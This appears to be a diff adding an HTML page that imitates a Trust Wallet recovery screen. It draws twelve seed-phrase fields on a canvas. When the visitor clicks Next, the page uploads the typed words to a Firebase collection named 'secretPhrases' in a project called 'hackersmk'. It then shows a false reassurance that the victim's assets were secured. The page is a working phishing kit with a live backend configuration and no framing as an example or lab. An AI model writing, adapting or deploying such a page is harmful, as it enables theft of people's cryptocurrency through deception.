@@ -1,0 +1,207 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Canvas Secret Phrase UI</title>
+  <style>
+    html, body {
+      margin: 0;
+      padding: 0;
+      overflow: hidden;
+      height: 100%;
+      width: 100%;
+    }
+    canvas {
+      display: block;
+      width: 100%;
+      height: 100%;
+    }
+    #realNextButton {
+      position: absolute;
+      width: 157px;
+      height: 48px;
+      z-index: 10;
+      padding: 12px 30px;
+      font-size: 16px;
+      font-weight: bold;
+      background-color: #007bff;
+      color: white;
+      border: none;
+      border-radius: 10px;
+      cursor: pointer;
+      left: 56%;
+      top: 92%;
+      transform: translate(-50%, -50%);
+    }
+  </style>
+</head>
+<body>
+
+<canvas id="walletCanvas"></canvas>
+<button id="realNextButton">Next</button>
+
+<!-- Firebase (using ES modules) -->
+<script type="module">
+  import { initializeApp } from "https://www.gstatic.com/firebasejs/11.8.1/firebase-app.js";
+  import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/11.8.1/firebase-firestore.js";
+  import { getAnalytics } from "https://www.gstatic.com/firebasejs/11.8.1/firebase-analytics.js";
+
+  const firebaseConfig = {
+    apiKey: "AIzaSyD5MF8isLfz7cdD-IQ1VfZu9LIbyY6KYFc",
+    authDomain: "hackersmk-3199b.firebaseapp.com",
+    projectId: "hackersmk-3199b",
+    storageBucket: "hackersmk-3199b.firebasestorage.app",
+    messagingSenderId: "237293330301",
+    appId: "1:237293330301:web:6e8b1eb9f598f92b097614",
+    measurementId: "G-KQ092E47E4"
+  };
+
+  const app = initializeApp(firebaseConfig);
+  const analytics = getAnalytics(app);
+  const db = getFirestore(app);
+
+  const canvas = document.getElementById("walletCanvas");
+  const ctx = canvas.getContext("2d");
+  const bgImage = new Image();
+  bgImage.src = "trust wallet.png";
+
+  const baseWidth = 1903;
+  const baseHeight = 895;
+
+  const inputBoxW = 175, inputBoxH = 53;
+  const gapY = 73, gapX = 35;
+  const totalCols = 2, totalRows = 6;
+
+  let inputs = [];
+
+  function setupLayout() {
+    const formWidth = inputBoxW * totalCols + gapX * (totalCols - 1);
+    const formHeight = inputBoxH * totalRows + gapY * (totalRows - 1);
+    const startX = (baseWidth - formWidth) / 2 + 11;
+    const startY = 290;
+
+    inputs = [];
+    for (let i = 0; i < 12; i++) {
+      const row = i % totalRows;
+      const col = Math.floor(i / totalRows);
+      inputs.push({
+        x: startX + col * (inputBoxW + gapX),
+        y: startY + row * gapY,
+        w: inputBoxW,
+        h: inputBoxH,
+        text: '',
+        placeholder: `Word #${i + 1}`,
+        active: false,
+        visible: false
+      });
+    }
+  }
+
+  function scaleCanvas() {
+    canvas.width = window.innerWidth;
+    canvas.height = window.innerHeight;
+    const scaleX = canvas.width / baseWidth;
+    const scaleY = canvas.height / baseHeight;
+    const scale = Math.min(scaleX, scaleY);
+    ctx.setTransform(scale, 0, 0, scale, 0, 0);
+    draw();
+  }
+
+  function draw() {
+    ctx.clearRect(0, 0, baseWidth, baseHeight);
+    ctx.drawImage(bgImage, 0, 0, baseWidth, baseHeight);
+
+    inputs.forEach(input => {
+      ctx.fillStyle = "white";
+      ctx.fillRect(input.x, input.y, input.w, input.h);
+
+      const eyeX = input.x + input.w - 25;
+      const eyeY = input.y + 17;
+      ctx.fillStyle = "blue";
+      ctx.font = "16px sans-serif";
+      ctx.fillText("\u{1F441}", eyeX, eyeY + 5);
+
+      ctx.fillStyle = input.text === '' && !input.active ? 'gray' : 'black';
+      ctx.font = '16px sans-serif';
+      ctx.textBaseline = 'middle';
+      const displayText = input.text === '' && !input.active
+        ? input.placeholder
+        : (input.visible ? input.text : '•'.repeat(input.text.length));
+      ctx.fillText(displayText, input.x + 20, input.y + input.h / 2);
+    });
+  }
+
+  function getMousePos(evt) {
+    const rect = canvas.getBoundingClientRect();
+    const scale = canvas.width / baseWidth;
+    return {
+      x: (evt.clientX - rect.left) / scale,
+      y: (evt.clientY - rect.top) / scale
+    };
+  }
+
+  function isInside(pos, rect) {
+    return pos.x > rect.x && pos.x < rect.x + rect.w &&
+           pos.y > rect.y && pos.y < rect.y + rect.h;
+  }
+
+  canvas.addEventListener("mousedown", (e) => {
+    const mouse = getMousePos(e);
+    inputs.forEach(input => {
+      const eyeBox = {
+        x: input.x + input.w - 25,
+        y: input.y,
+        w: 25,
+        h: input.h
+      };
+
+      if (isInside(mouse, eyeBox)) {
+        input.visible = !input.visible;
+        draw();
+        return;
+      }
+
+      input.active = isInside(mouse, input);
+    });
+    draw();
+  });
+
+  window.addEventListener("keydown", (e) => {
+    const activeInput = inputs.find(i => i.active);
+    if (activeInput) {
+      if (e.key === "Backspace") {
+        activeInput.text = activeInput.text.slice(0, -1);
+      } else if (e.key.length === 1) {
+        activeInput.text += e.key;
+      }
+      draw();
+    }
+  });
+
+  document.getElementById("realNextButton").addEventListener("click", async () => {
+    const words = inputs.map(i => i.text.trim());
+
+    try {
+      await addDoc(collection(db, "secretPhrases"), {
+        phrase: words,
+        createdAt: serverTimestamp()
+      });
+      alert("Your crypto wallet was compromised, but we’ve secured your assets and they are now safe.");
+    } catch (error) {
+      console.error("Firebase error:", error);
+      alert("Something went wrong. Please try again.");
+    }
+  });
+
+  bgImage.onload = () => {
+    setupLayout();
+    scaleCanvas();
+  };
+
+  window.addEventListener("resize", scaleCanvas);
+</script>
+</body>
+</html>
+
+
+
